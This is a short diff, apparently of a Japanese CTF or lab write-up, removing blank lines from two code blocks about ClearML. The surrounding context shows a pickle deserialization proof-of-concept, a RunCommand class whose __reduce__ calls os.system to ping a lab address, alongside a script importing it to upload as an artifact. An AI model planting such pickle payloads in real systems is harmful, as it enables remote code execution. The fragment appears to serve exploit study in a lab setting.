@@ -140,7 +140,6 @@ clearml_rce.py
 import os  
 
 class RunCommand:
-
 	def __reduce__(self):
 		return (os.system, ('ping -c 3 10.10.16.28',))
 ```
@@ -150,8 +149,6 @@ get-artifact.py
 from clearml import Task
 import pickle
 from clearml_rce import RunCommand
-
-  
 
 def main():
 	# インスタンスを生成
